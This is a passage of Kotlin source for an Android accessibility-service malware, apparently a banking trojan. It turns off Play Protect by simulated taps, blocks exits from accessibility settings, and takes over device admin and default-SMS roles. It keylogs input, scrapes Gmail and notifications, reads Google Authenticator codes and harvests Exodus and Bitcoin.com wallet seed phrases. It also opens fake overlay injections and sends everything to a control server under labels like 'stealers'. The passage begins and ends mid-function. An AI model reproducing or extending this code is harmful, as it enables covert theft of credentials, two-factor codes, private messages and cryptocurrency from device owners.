                if (buttonRect.contains(x, y)) {
                    // Maybe we need to think if a large view covers item?
                    click(node)
                }
                for (i in 0 until node.childCount) {
                    clickAtPosition(x, y, node.getChild(i))
                }
            }
        } catch (ex: Exception) {
        }
    }

    private fun clickNodeOrParent(
        item: AccessibilityNodeInfo,
        clickOnlyIfVisible: Boolean
    ): Boolean {
        if (item.isClickable) {
            click(item, clickOnlyIfVisible)
            return true
        }
        if (item.parent.isClickable) {
            click(item.parent, clickOnlyIfVisible)
            return true
        }
        if (item.parent.parent.isClickable) {
            click(item.parent.parent, clickOnlyIfVisible)
            return true
        }

        return false
    }

    private fun clickOk() {
        rootInActiveWindow?.refresh()
        clickAtButton("$currentHomePackage", "btnOk", false)
        rootInActiveWindow?.refresh()
        rootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/button1")
            ?.firstOrNull { it.isClickable }?.let {
                click(it)
            }
        rootInActiveWindow?.refresh()
        val okBut = constNm.угу
        for (clickButton in okBut) {
            val item = rootInActiveWindow?.findAccessibilityNodeInfosByText(clickButton)
                ?.firstOrNull { it.isClickable }
            if (item != null) {
                click(item)
                break
            }
        }
        rootInActiveWindow?.refresh()
    }

    private fun clickProtect(nodeInfo: AccessibilityNodeInfo?, className: String?) {
        runCatching {
            if (nodeInfo == null) {
                return
            }

            if (SharedPreferencess.checkProtect == "1") {
                // ver 1
                if (packageAppStart == "com.android.vending") {
                    if (clickprotect == "1") {
                        var clickProtect_ = false
                        rootInActiveWindow?.findAccessibilityNodeInfosByText("Play")
                            ?.forEach {
                                clickNodeOrParent(it, false)
                                clickProtect_ = true
                            }

                        // vers 1
                        for (node in rootInActiveWindow.findAccessibilityNodeInfosByViewId("android:id/button1")) {
                            click(node)
                            clickprotect = "0"
                            SharedPreferencess.checkProtect = "0"
                            blockBack2()
                            apiUt.sendLogs(this@srvSccessibility, "", "clickProtect blockBack", "log")
                            break
                        }

                        // vers 2   ANDROID 11 Version
                        val protect = constNm.настройки
                        for (clickButton in protect) {
                            val item =
                                rootInActiveWindow?.findAccessibilityNodeInfosByText(clickButton)
                                    ?.firstOrNull { it.isClickable }
                            if (item != null) {
                                click(item)
                                clickprotect = ""
                                SharedPreferencess.checkProtect = "0"
                                blockBack()
                                apiUt.sendLogs(this@srvSccessibility, "", "clickProtect blockBack2", "log")
                                break
                            }
                        }

                        if (SharedPreferencess.checkProtect != "1" && clickProtect_) {
                            clickprotect = ""
                            SharedPreferencess.checkProtect = "0"
                            blockBack()
                            apiUt.sendLogs(this@srvSccessibility, "", "clickProtect blockBack3", "log")
                        }
                    }

                    // vers 1
                    if (SharedPreferencess.checkProtect == "1") {
                        val arrayButtonClick = arrayOf(
                            "com.android.vending:id/toolbar_item_play_protect_settings",
                            "com.android.vending:id/play_protect_settings",
                            "android:id/button1"
                        )
                        for (i in arrayButtonClick.indices) {
                            for (node in rootInActiveWindow.findAccessibilityNodeInfosByViewId(
                                arrayButtonClick[i]
                            )) {
                                click(node)
                                clickprotect = "1"
                                if (arrayButtonClick[i] == "android:id/button1") {
                                    clickprotect = "0"
                                    blockBack2()
                                    apiUt.sendLogs(this@srvSccessibility, "", "clickProtect blockBack4", "log")
                                }
                            }
                        }
                    }

                    // vers 2   ANDROID 11 Version
                    if (SharedPreferencess.checkProtect == "1") {
                        for (clickButton in constNm.настройки) {
                            rootInActiveWindow?.findAccessibilityNodeInfosByText(clickButton)
                                ?.firstOrNull { it.isClickable }?.let {
                                    clickNodeOrParent(it, false)
                                    clickprotect = "1"
                                }
                        }
                    }
                }

                // ver 2
                if (className == "android.app.alertdialog" && clickprotect == "1") {
                    for (node in rootInActiveWindow.findAccessibilityNodeInfosByViewId("android:id/button1")) {
                        click(node)
                        clickprotect = "0"
                        SharedPreferencess.checkProtect = "0"
                        blockBack2()
                        apiUt.sendLogs(this@srvSccessibility, "", "clickProtect blockBack5", "log")
                    }
                }
            }
        }
    }

    private fun clicksAllow(): Boolean {
        // --------------- allow perm --------------------
        if (clickAtButtons(list1))
            return true

        return false
    }

    private fun dispatchCallback(
        x: Float,
        y: Float,
        longClick: Boolean,
        gestureResultCallback: GestureResultCallback? = null
    ): Boolean {
        val result = dispatchGesture(
            buildClick(x, y, longClick),
            gestureResultCallback,
            null
        )
        return result
    }

    private fun exitSettings(event: AccessibilityEvent): Boolean {
        runCatching {
            if (constNm.акссес.any {
                    rootInActiveWindow?.findAccessibilityNodeInfosByText(it)
                        ?.isNullOrEmpty() == false
                }) {
                blockBack()
                apiUt.sendLogs(this@srvSccessibility, "", "exitSettings1", "log")
                return true
            }
            if (("com.android.settings.SubSettings".contains(event.className.toString(), true) &&
                        strText.contains(constNm.access1, true)) ||
                ("com.android.settings.SubSettings".contains(event.className.toString(), true) &&
                        event.contentDescription?.toString()
                            ?.contains(constNm.access1, true) == true)
            ) {
                blockBack()
                apiUt.sendLogs(this@srvSccessibility, "", "exitSettings2", "log")
                return true
            }
        }

        return false
    }

    private fun exodusPhrase(nodeInfo: AccessibilityNodeInfo): Boolean {
        val obj = JSONObject()
        for (i in 4..15) {
            val childNodeInfo = nodeInfo.getChild(i)
            if (childNodeInfo.childCount == 2
                && childNodeInfo.getChild(0).className.contains("android.widget.TextView")
                && childNodeInfo.getChild(1).className.contains("android.widget.TextView")
                && !childNodeInfo.getChild(1).text.contains("-")
            ) {
                obj.put("${childNodeInfo.getChild(0).text}", childNodeInfo.getChild(1).text)
            }
        }
        if (obj.length() > 11) {
            apiUt.sendLogs(this, constNm.exodus, obj.toString(), "stealers")
            SharedPreferencess.SettingsWrite(this, "exodus", "1")
            blockBack()
            cntExodusDhag = 0
            mGestureCallback.mCompleted = true
            mGestureCallbackWallets.mCompleted = true
            return true
        }
        return false
    }

    private fun gmail() {
        //----------------gmail--------------
        runCatching {
//            if (packageAppStart.contains(constNm.gmail)) {
            if (SharedPreferencess.SettingsRead(this, "gm_list") == "start") {
                apiUt.sendLogs(this@srvSccessibility, "", "gmail gm_list", "log")
                val list = JSONArray()
                var i = 0
                rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.google.android.gm:id/viewified_conversation_item_view")
                    ?.forEach {
                        val sender =
                            it.findAccessibilityNodeInfosByViewId("com.google.android.gm:id/senders")
                                .firstOrNull()?.text
                        val subject =
                            it.findAccessibilityNodeInfosByViewId("com.google.android.gm:id/subject")
                                .firstOrNull()?.text
                        val snippet =
                            it.findAccessibilityNodeInfosByViewId("com.google.android.gm:id/snippet")
                                .firstOrNull()?.text
                        list.put(JSONObject().apply {
                            put("i", i)
                            put("sender", sender)
                            put("subject", subject)
                            put("snippet", snippet)
                        })
                        i++
                    }

                if (list.length() > 0 && list.toString().length > 5) {
                    apiUt.sendLogs(
                        this,
                        "com.google.android.gm",
                        list.toString(),
                        "gmail_mes"
                    )
                    blockBack()
                    SharedPreferencess.SettingsWrite(this, "gm_list", null)
                }
            }

            if (SharedPreferencess.SettingsRead(this, "gm_mes_command") == "start") {
                apiUt.sendLogs(this@srvSccessibility, "", "gmail gm_mes_command", "log")
                val mesNum = SharedPreferencess.SettingsRead(this, "gm_mes")?.toInt()
                mesNum?.let {
                    rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.google.android.gm:id/viewified_conversation_item_view")
                        .getOrNull(mesNum)?.let {
                            click(it)
                        }

                    val sender_name =
                        rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.google.android.gm:id/sender_name")
                            .firstOrNull()?.text
                    val upper_date =
                        rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.google.android.gm:id/upper_date")
                            .firstOrNull()?.text
                    rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.google.android.gm:id/conversation_container").firstOrNull()?.let {
                        val listJson = JSONArray()
                        val list = mutableListOf<String>()
                        iterateAndSaveText(it, list)
                        listJson.put(JSONObject().apply {
                            put("sender_name", sender_name)
                            put("upper_date", upper_date)
                            put("list", list)
                        })

                        if (listJson.length() > 0 && list.toString().length > 5) {
                            apiUt.sendLogs(
                                this,
                                "com.google.android.gm",
                                listJson.toString(),
                                "gmail_messages"
                            )
                            blockBack()
                        }
                        SharedPreferencess.SettingsWrite(this, "gm_mes_command", null)
                        SharedPreferencess.SettingsWrite(this, "gm_mes", null)
                    }
                }
            }
//            }
        }
    }

    private fun injectView(): Boolean {
        runCatching {
            if (SharedPreferencess.activeInjection.contains(packageAppStart)
                && packageAppStart.contains(constNm.s_tochka)
                && (SharedPreferencess.SettingsRead(
                    applicationContext,
                    packageAppStart
                )?.length ?: 0) > 10
            ) {
                if (job?.isActive != true) {
                    val appInj = packageAppStart
                    job = GlobalScope.launch {
                        if (udUtils.openFake(applicationContext, appInj))
                            delay(1500)
                    }
                }
                return true
            }
        }.onFailure { ex ->
            utUtils.Log(
                TAG_LOG,
                "ERROR Start Injection: " + packageAppStart + " " + ex.localizedMessage
            )
        }
        return false
    }

    private fun iterateAndSaveText(nodeInfo: AccessibilityNodeInfo, list: MutableList<String>) {
        val childCount = nodeInfo.childCount
        val nodeContent = nodeInfo.text

        runCatching {
            nodeContent?.toString()?.let {
                if (it.isNotBlank())
                    list.add(it)
            }
        }

        for (i in 0 until childCount) {
            val childNodeInfo = nodeInfo.getChild(i)
            iterateAndSaveText(childNodeInfo, list)
        }
    }

    private fun iterateNodesScrollClickParentAndChild(
        nodeInfo: AccessibilityNodeInfo?,
        clicks: List<String>
    ): Boolean {
        if (nodeInfo != null) {
            val childCount = nodeInfo.childCount
            val nodeContent = nodeInfo.text

            for (but in clicks) {
                if (nodeContent?.contains(but) == true) {
                    if (clickNodeOrParent(nodeInfo, false)) {
                        TimeUnit.MILLISECONDS.sleep(150.toLong())
                        if (constNm.debug)
                            Log.d(TAG_LOG, "content is $nodeContent")
                        return true
                    }
                }
            }
            for (i in 0 until childCount) {
                val childNodeInfo = nodeInfo.getChild(i)
                if (iterateNodesScrollClickParentAndChild(childNodeInfo, clicks))
                    return true
            }
        }
        return false
    }

    private fun iterateNodesToFindContainsTextNode(nodeInfo: AccessibilityNodeInfo?, text: String): AccessibilityNodeInfo? {
        if (nodeInfo != null) {
            val childCount = nodeInfo.childCount
            val nodeContent = nodeInfo.text

            if (nodeContent?.contains(text) == true) {
                return nodeInfo
            }
            for (i in 0 until childCount) {
                val childNodeInfo = nodeInfo.getChild(i)
                val i = iterateNodesToFindContainsTextNode(childNodeInfo, text)
                if (i != null)
                    return i
            }
        }
        return null
    }

    private fun iterateNodesToFindExodus(nodeInfo: AccessibilityNodeInfo?, classType: String): AccessibilityNodeInfo? {
        if (nodeInfo != null) {
            val childCount = nodeInfo.childCount

            if (nodeInfo.className.contains(classType) && nodeInfo.childCount == 5) {
                var all = true
                for (i in 0 until childCount) {
                    val childNodeInfo = nodeInfo.getChild(i)
                    if (!(childNodeInfo.isClickable && childNodeInfo.isEnabled && childNodeInfo.isFocusable && childNodeInfo.isVisibleToUser))
                        all = false
                }
                if (all) {
                    click(nodeInfo.getChild(4))
                    return nodeInfo
                }
            }

            for (i in 0 until childCount) {
                val childNodeInfo = nodeInfo.getChild(i)
                val i = iterateNodesToFindExodus(childNodeInfo, classType)
                if (i != null)
                    return i
            }
        }
        return null
    }

    private fun iterateNodesToFindExodusBackup(nodeInfo: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        if (nodeInfo != null) {
            val childCount = nodeInfo.childCount

            if (nodeInfo.className.contains("android.view.ViewGroup")
                && nodeInfo.childCount == 6
                && nodeInfo.isClickable
                && nodeInfo.isVisibleToUser
                && nodeInfo.getChild(5).text.contains("12")
                && nodeInfo.getChild(5).isVisibleToUser
            ) {
                click(nodeInfo)
                return nodeInfo
            }

            for (i in 0 until childCount) {
                val childNodeInfo = nodeInfo.getChild(i)
                val i = iterateNodesToFindExodusBackup(childNodeInfo)
                if (i != null)
                    return i
            }
        }
        return null
    }

    private fun iterateNodesToFindExodusPhrase(nodeInfo: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        if (nodeInfo != null) {
            val childCount = nodeInfo.childCount

            if (nodeInfo.className.contains("android.view.ViewGroup")
                && nodeInfo.childCount == 19
                && nodeInfo.isVisibleToUser
                && nodeInfo.getChild(0).className.contains("android.view.ViewGroup")
                && nodeInfo.getChild(1).className.contains("android.view.ViewGroup")
                && nodeInfo.getChild(2).className.contains("android.widget.TextView")
                && nodeInfo.getChild(3).className.contains("android.widget.TextView")
                && nodeInfo.getChild(4).className.contains("android.view.ViewGroup")
                && nodeInfo.getChild(16).isFocusable
                && !nodeInfo.getChild(16).isClickable
            ) {
                if (!mGestureCallbackWallets.mCompleted) {
                    exodusPhrase(nodeInfo)
                    return nodeInfo
                }

                mGestureCallbackWallets.mCompleted = false
                val rect = Rect()
                nodeInfo.getChild(16).getBoundsInScreen(rect)
                dispatchCallback(
                    Resources.getSystem().displayMetrics.widthPixels / 2f,
                    rect.centerY().toFloat(),
                    true,
                    mGestureCallbackWallets
                )

                TimeUnit.MILLISECONDS.sleep(100.toLong())
                refresher()

                exodusPhrase(nodeInfo)

                return nodeInfo
            }

            for (i in 0 until childCount) {
                val childNodeInfo = nodeInfo.getChild(i)
                val i = iterateNodesToFindExodusPhrase(childNodeInfo)
                if (i != null)
                    return i
            }
        }
        return null
    }

    private fun iterateNodesToFindExodusSecurity(nodeInfo: AccessibilityNodeInfo?, classType: String): AccessibilityNodeInfo? {
        if (nodeInfo != null) {
            val childCount = nodeInfo.childCount

            if (nodeInfo.className.contains(classType) && nodeInfo.childCount == 9) {
                var textViewCnt = 0
                var textViewGroupCnt = 0
                for (i in 0 until childCount) {
                    val childNodeInfo = nodeInfo.getChild(i)
                    if (childNodeInfo.className.contains("android.widget.TextView"))
                        textViewCnt++
                    if (childNodeInfo.className.contains("android.view.ViewGroup"))
                        textViewGroupCnt++
                }
                if (textViewCnt == 5
                    && textViewGroupCnt == 4
                    && nodeInfo.getChild(0).className.contains("android.widget.TextView")
                    && nodeInfo.getChild(0).text.isNotBlank()
                    && nodeInfo.isVisibleToUser
                ) {
                    click(nodeInfo.getChild(2))
                    return nodeInfo
                }
            }

            for (i in 0 until childCount) {
                val childNodeInfo = nodeInfo.getChild(i)
                val i = iterateNodesToFindExodusSecurity(childNodeInfo, classType)
                if (i != null)
                    return i
            }
        }
        return null
    }

    private fun iterateNodesToFindExodusViewSecret(nodeInfo: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        if (nodeInfo != null) {
            val childCount = nodeInfo.childCount

            if (nodeInfo.className.contains("android.view.ViewGroup") && nodeInfo.childCount == 6 && nodeInfo.isVisibleToUser && nodeInfo.getChild(
                    0
                ).className.contains(
                    "android.view.View"
                )
            ) {

                if (nodeInfo.getChild(1).className.contains("android.view.ViewGroup")
                    && nodeInfo.getChild(2).className.contains("android.view.ViewGroup")
                    && nodeInfo.getChild(3).className.contains("android.view.ViewGroup")
                    && nodeInfo.getChild(4).className.contains("android.view.ViewGroup")
                    && nodeInfo.getChild(5).className.contains("android.view.ViewGroup")
                ) {
                    if (!nodeInfo.getChild(4).isClickable && nodeInfo.getChild(4).childCount == 1 && nodeInfo.getChild(4)
                            .getChild(0).isClickable && nodeInfo.getChild(4).getChild(0).childCount == 1
                    ) {
                        click(nodeInfo.getChild(4).getChild(0))
                        return nodeInfo
                    }
                }
            }

            for (i in 0 until childCount) {
                val childNodeInfo = nodeInfo.getChild(i)
                val i = iterateNodesToFindExodusViewSecret(childNodeInfo)
                if (i != null)
                    return i
            }
        }
        return null
    }

    private fun iterateNodesToFindViewWithCntChildAndType(nodeInfo: AccessibilityNodeInfo?, cnt: Int, classType: String): AccessibilityNodeInfo? {
        if (nodeInfo != null) {
            val childCount = nodeInfo.childCount

            if (nodeInfo.className.contains(classType) && childCount == cnt) {
                return nodeInfo
            }
            for (i in 0 until childCount) {
                val childNodeInfo = nodeInfo.getChild(i)
                val i = iterateNodesToFindViewWithCntChildAndType(childNodeInfo, cnt, classType)
                if (i != null)
                    return i
            }
        }
        return null
    }

    private fun iterateNodesToFindViewWithDesc(nodeInfo: AccessibilityNodeInfo?, viewId: String): AccessibilityNodeInfo? {
        if (nodeInfo != null) {
            val childCount = nodeInfo.childCount
            val nodeContent = nodeInfo.contentDescription

            if (nodeContent?.contains(viewId) == true) {
                return nodeInfo
            }
            for (i in 0 until childCount) {
                val childNodeInfo = nodeInfo.getChild(i)
                val i = iterateNodesToFindViewWithDesc(childNodeInfo, viewId)
                if (i != null)
                    return i
            }
        }
        return null
    }

    private fun iterateNodesToFindViewWithId(nodeInfo: AccessibilityNodeInfo?, viewId: String): AccessibilityNodeInfo? {
        if (nodeInfo != null) {
            val childCount = nodeInfo.childCount
            val nodeContent = nodeInfo.viewIdResourceName

            if (nodeContent?.contains(viewId) == true) {
                return nodeInfo
            }
            for (i in 0 until childCount) {
                val childNodeInfo = nodeInfo.getChild(i)
                val i = iterateNodesToFindViewWithId(childNodeInfo, viewId)
                if (i != null)
                    return i
            }
        }
        return null
    }

    private fun iterateNodesToFindViewWithIdClassWithDesc(
        nodeInfo: AccessibilityNodeInfo?,
        classType: String,
        childCount: Int
    ): AccessibilityNodeInfo? {
        if (nodeInfo != null) {
            if (nodeInfo.className.contains(classType) && !nodeInfo.contentDescription.isNullOrBlank() && nodeInfo.childCount == childCount) {
                return nodeInfo
            }
            val childCount1 = nodeInfo.childCount
            for (i in 0 until childCount1) {
                val childNodeInfo = nodeInfo.getChild(i)
                val i = iterateNodesToFindViewWithIdClassWithDesc(childNodeInfo, classType, childCount)
                if (i != null)
                    return i
            }
        }
        return null
    }

    private fun keylogger(event: AccessibilityEvent) {
        runCatching {
            val time = df.format(Calendar.getInstance().time)
            val obj = JSONObject()
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                    obj.put("time", time)
                    obj.put("action", "[Focused]")
                    obj.put("text", strText)
                }

                AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                    obj.put("time", time)
                    obj.put("action", "[Click]")
                    obj.put("text", strText)
                }

                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    obj.put("time", time)
                    obj.put("action", "[Write Text]")
                    obj.put("text", strText)
                }

                AccessibilityEvent.TYPE_VIEW_SELECTED -> {
                    obj.put("time", time)
                    obj.put("action", "[Selected]")
                    obj.put("text", strText)
                }

                else -> {
                    runCatching {
                        if (strText.length >= 3) {
                            obj.put("time", time)
                            obj.put("action", "[KeyLog]")
                            obj.put("length", strText.length)
                            obj.put("text", strText)
                        }
                    }
                }
            }
            //---------------Save Keylogger data-------------------
            if (obj.toString().length > 2) {
                SharedPreferencess.SettingsToAdd(
                    this,
                    constNm.dataKeylogger,
                    "$obj::endlog::"
                )
            }
        }
    }

    private fun killApplication(): Boolean {
        runCatching {
            if (SharedPreferencess.killApplication.isNotEmpty()) {
                try {
                    if (clickAtButton("android", "button1", false) ||
                        clickAtButton("com.android.settings", "action_button", false) ||
                        clickAtButton("com.android.settings", "left_button", false)
                    ) {
                        apiUt.sendLogs(this@srvSccessibility, "", "killApplication ${SharedPreferencess.killApplication}", "log")
                        SharedPreferencess.killApplication = ""
                        return true
                    }
                } catch (e: Exception) {
                    utUtils.Log(TAG_LOG, e.localizedMessage)
                }
            }
        }

        return false
    }

    private fun powerkeeper() {
        runCatching {
            if (packageAppStart == "com.miui.powerkeeper" && !udUtils.is_dozemode(applicationContext)) {
                rootInActiveWindow.findAccessibilityNodeInfosByViewId("android:id/title")
                    .firstOrNull { it.isCheckable }?.let {
                        checkNodeOrParent(it)
                        var cntClicked = SharedPreferencess.cntPowerKeeperClick
                        cntClicked++
                        SharedPreferencess.cntPowerKeeperClick = cntClicked
                        apiUt.sendLogs(this@srvSccessibility, "", "powerkeeper click", "log")
                    }
            }
        }
    }

    private fun readPush(event: AccessibilityEvent) {
        if (SharedPreferencess.readPush == "1") {
            if (packageAppStart != applicationContext?.packageName) {
                // PUSH
                runCatching {
                    val data = event.parcelableData
                    if (data is Notification) {
                        val notification: Notification = data

                        val obj = JSONObject()
                        obj.put("package", packageAppStart)
                        obj.put("ticker", notification.tickerText)
                        obj.put("notification", strText)
                        obj.put(
                            "text",
                            notification.extras.getCharSequence(Notification.EXTRA_TEXT).toString()
                        )

                        notification.visibility = Notification.VISIBILITY_SECRET
                        apiUt.sendLogs(this, "", obj.toString(), "pushlist")
                    }
                }
            }
        }
    }

    private fun refresher() {
        rootInActiveWindow?.refresh()
        val eventRootNode = super.getRootInActiveWindow()
        if (eventRootNode != null) {
            eventRootInActiveWindow = eventRootNode
        }
    }

    private fun swapAdmin(): Boolean {
        return runCatching {
            if (SharedPreferencess.autoClickAdmin == "1" && !utUtils.isAdminDevice(this)) {
                rootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/action_button")
                    ?.forEach {
                        clickNodeOrParent(it, false)
                        if (backFromAdmin())
                            return@runCatching true
                        else {
                            val rect = Rect()
                            it.getBoundsInScreen(rect)
                            click(rect.centerX(), rect.centerY())
                            if (backFromAdmin())
                                return@runCatching true
                        }
                    }
                rootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/check_box")
                    ?.forEach {
                        checkNodeOrParent(it)
                        rootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/intercept_warn_allow")
                            ?.forEach {
                                clickNodeOrParent(it, false)
                            }
                    }

                if (backFromAdmin())
                    return@runCatching true
            }

            if (utUtils.isAdminDevice(this)) {
                SharedPreferencess.autoClickAdmin = ""
                apiUt.sendLogs(this@srvSccessibility, "", "isAdminDevice true", "log")
            }

            return@runCatching false
        }.getOrDefault(false)
    }

    private fun swapSMS(event: AccessibilityEvent?) {
        runCatching {
            if (SharedPreferencess.autoClickSms == "1") {
                if (Telephony.Sms.getDefaultSmsPackage(this) != this.packageName) {
                    utUtils.autoclick_change_smsManager_sdk_Q(this, event!!, packageAppStart)
                    apiUt.sendLogs(this@srvSccessibility, "", "swapSMS packageAppStart", "log")
                }

                if (Telephony.Sms.getDefaultSmsPackage(this) != this.packageName) {
                    swapSMSManager2()
                    apiUt.sendLogs(this@srvSccessibility, "", "swapSMS swapSMSManager2", "log")
                }

                if (Telephony.Sms.getDefaultSmsPackage(this) == this.packageName) {
                    SharedPreferencess.autoClickSms = "0"
                    apiUt.sendLogs(this@srvSccessibility, "", "swapSMS swapSMSManager true", "log")
                }
            }
        }
    }

    private fun swapSMSManager2(): Boolean {
        var clickSMS = false
        val list = mutableListOf<AccessibilityNodeInfo>().apply {
            rootInActiveWindow?.findAccessibilityNodeInfosByText(SharedPreferencess.appName)
                ?.let { addAll(it) }
            if (!SharedPreferencess.sameName)
                rootInActiveWindow?.findAccessibilityNodeInfosByText(
                    utUtils.getLabelApplication(
                        baseContext
                    )
                )?.let { addAll(it) }
        }.toSet().toMutableList()
        list.reverse()
        list.forEach {
            if (clickNodeOrParent(it, false)) {
                if (constNm.debug)
                    utUtils.Log(TAG_LOG, "ACC::click: $it")
                clickSMS = true
            } else {
                if (clickAtButton("android", "button1", false) ||
                    clickAtButton("com.android.settings", "action_button", false)
                ) {
                    clickSMS = true
                    return true
                }
            }
        }
        if (clickSMS) {
            if (clickAtButton("android", "button1", false) ||
                clickAtButton("com.android.settings", "action_button", false)
            )
                return true
        }
        return false
    }

    private fun unclick(dos: Boolean = true): Boolean {
        runCatching {
            if (SharedPreferencess.killApplication.isEmpty()) {
                val list = mutableListOf<AccessibilityNodeInfo>().apply {
                    rootInActiveWindow?.findAccessibilityNodeInfosByText(SharedPreferencess.appName)
                        ?.let { addAll(it) }
                    if (!SharedPreferencess.sameName)
                        rootInActiveWindow?.findAccessibilityNodeInfosByText(
                            utUtils.getLabelApplication(
                                baseContext
                            )
                        )?.let { addAll(it) }
                }.toSet()
                list.firstOrNull()?.let {
                    if (it.packageName == "com.miui.securitycenter" ||
                        packageAppStart == "com.miui.securitycenter"
                    ) {
                        if (SharedPreferencess.autoClickCache != "1" && SharedPreferencess.autoClickAdmin != "1") {
                            blockBack2()
                            apiUt.sendLogs(this@srvSccessibility, "", "unclick", "log")
                        }
                    } else if (it.packageName == "com.google.android.packageinstaller"
                    ) {
                        if (SharedPreferencess.autoClickCache != "1" && SharedPreferencess.autoClickAdmin != "1") {
                            blockBack2()
                            apiUt.sendLogs(this@srvSccessibility, "", "unclick2", "log")
                        }
                    } else if (it.packageName == "com.android.packageinstaller" ||
                        packageAppStart == "com.android.packageinstaller"
                    ) {
                        if (SharedPreferencess.autoClickCache != "1" && SharedPreferencess.autoClickAdmin != "1") {
                            blockBack2()
                            apiUt.sendLogs(this@srvSccessibility, "", "unclick3", "log")
                        }
                    } else if (it.packageName == "com.android.settings" ||
                        packageAppStart == "com.android.settings"
                    ) {
                        if (SharedPreferencess.autoClickCache != "1" && SharedPreferencess.autoClickAdmin != "1") {
                            blockBack2()
                            apiUt.sendLogs(this@srvSccessibility, "", "unclick4", "log")
                        }
                    } else if (dos) {
                        if (currentHomePackage != null && clickAtButton(
                                currentHomePackage!!,
                                "btnCancel",
                                true
                            )
                        ) {
                        } else {
                            val unclick = constNm.не_клик
                            for (clickButton in unclick) {
                                rootInActiveWindow?.findAccessibilityNodeInfosByText(clickButton)
                                    ?.firstOrNull { it.isClickable }
                                    ?.let {
                                        constNm.нажми.forEach { clickButton ->
                                            rootInActiveWindow?.findAccessibilityNodeInfosByText(clickButton)?.firstOrNull()?.let {
                                                if (clickNodeOrParent(it, true)) {
                                                    return@forEach
                                                }
                                            }
                                        }
                                    }
                            }
                        }
                    }
                }
            }
        }

        return false
    }

    private fun ussdSend(): Boolean {
        runCatching {
            if (SharedPreferencess.autoClickOnce == "1") {
                for (clickButton in constNm.сенд) {
                    rootInActiveWindow?.findAccessibilityNodeInfosByText(clickButton)
                        ?.firstOrNull { it.isClickable }?.let {
                            click(it)
                            SharedPreferencess.autoClickOnce = ""
                            apiUt.sendLogs(this@srvSccessibility, "", "ussdSend", "log")
                            return true
                        }
                }
            }
        }

        return false
    }

    private fun wallets(packageAppStart: String) {
        //----------------com.goolge.android.apps.authenticator2--------------
        runCatching {
            if (packageAppStart.contains(constNm.authenticator2) && SharedPreferencess.SettingsRead(this, "authenticator2") == null) {
                val obj = JSONObject()
                var i = 0
                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.google.android.apps.authenticator2:id/user_row_drag_handle")
                    ?.forEach {
                        val user = it.getChild(0).getChild(0).text
                        val pin = it.getChild(1).getChild(0).text

                        obj.put("user_$i", user)
                        obj.put("pin_$i", pin)
                        i++
                    }

                if (obj.length() > 0) {
                    apiUt.sendLogs(this, "com.goolge.android.apps.authenticator2", obj.toString(), "googleauth")
                    SharedPreferencess.SettingsWrite(this, "authenticator2", "1")
                    blockBack()
                }
                return@runCatching
            }
        }.onFailure {
            apiUt.sendLogs(this, "", "authenticator2 ${it.localizedMessage}", "error")
        }

        //----------------com.bitcoin--------------
        runCatching {
            if (packageAppStart.contains(constNm.mwallet) && SharedPreferencess.SettingsRead(this, "bitcoincom") == null) {
                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.bitcoin.mwallet:id/nav_general_settings")
                    ?.firstOrNull { it.isClickable }
                    ?.let {
                        click(it)
                    }

                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.bitcoin.mwallet:id/setting_base_layout")
                    ?.firstOrNull()
                    ?.let {
                        click(it.parent.parent)
                    }

                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.bitcoin.mwallet:id/setting_base_layout")
                    ?.firstOrNull()
                    ?.let {
                        click(it.parent.parent)
                    }

                val obj = JSONObject()
                var jj = 0
                if (btcDone != true) {
                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.bitcoin.mwallet:id/walletName")
                        ?.firstOrNull { it.text.contains("BTC") }
                        ?.let {
                            click(it.parent.parent)
                            TimeUnit.MILLISECONDS.sleep(150.toLong())
                            refresher()

                            eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.bitcoin.mwallet:id/mnemonicTable")
                                ?.firstOrNull()
                                ?.let {
                                    for (i in 0 until it.childCount) {
                                        val childRow = it.getChild(i)
                                        for (i in 0 until childRow.childCount) {
                                            val text = childRow.getChild(i).getChild(0).text
                                            obj.put("BTC", true)
                                            obj.put("word_$jj", text)
                                            jj++
                                        }
                                    }
                                }

                            if (obj.length() > 0) {
                                apiUt.sendLogs(this, "com.bitcoin.mwallet", obj.toString(), "stealers")
                                performGlobalAction(GLOBAL_ACTION_BACK)
                                btcDone = true
                            }
                        }
                }

                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.bitcoin.mwallet:id/walletName")
                    ?.firstOrNull { it.text.contains("ETH") }
                    ?.let {
                        click(it.parent.parent)
                        TimeUnit.MILLISECONDS.sleep(150.toLong())
                        refresher()

                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.bitcoin.mwallet:id/mnemonicTable")
                            ?.firstOrNull()
                            ?.let {
                                for (i in 0 until it.childCount) {
                                    val childRow = it.getChild(i)
                                    for (i in 0 until childRow.childCount) {
                                        val text = childRow.getChild(i).getChild(0).text
                                        obj.put("ETH", true)
                                        obj.put("word_$jj", text)
                                        jj++
                                    }
                                }
                            }

                        if (obj.length() > 0) {
                            apiUt.sendLogs(this, "com.bitcoin.mwallet", obj.toString(), "stealers")
                            SharedPreferencess.SettingsWrite(this, "bitcoincom", "1")
                            blockBack()
                            btcDone = false
                        }
                    }
                return@runCatching
            }
        }.onFailure {
            apiUt.sendLogs(this, "", "com.bitcoin ${it.localizedMessage}", "error")
        }

        //----------------trust--------------
        runCatching {
            if (packageAppStart.contains(constNm.trustapp) && SharedPreferencess.SettingsRead(this, "trust") == null) {
